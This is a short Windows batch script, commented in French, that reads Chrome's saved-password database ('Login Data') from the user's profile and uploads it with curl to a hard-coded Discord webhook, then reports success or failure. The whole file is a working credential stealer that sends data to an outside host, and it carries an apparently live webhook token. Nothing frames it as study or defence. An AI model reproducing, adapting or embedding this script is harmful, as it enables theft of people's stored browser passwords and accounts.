set "webhook_url=https://discord.com/api/webhooks/1177006144699506749/JBM_hoiJARsgmCcDM_Z1rptaRqAPYEQcbJ1fqHbeVV70qcf-ILivPgdwgcfs8-hVA5Ba"
set "chrome_login_data=%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data"

REM Envoyer le fichier via le webhook Discord
curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%chrome_login_data%" %webhook_url%

if %errorlevel% neq 0 (
    echo Failed to send file to Discord.
) else (
    echo File sent successfully to Discord.
)

exit
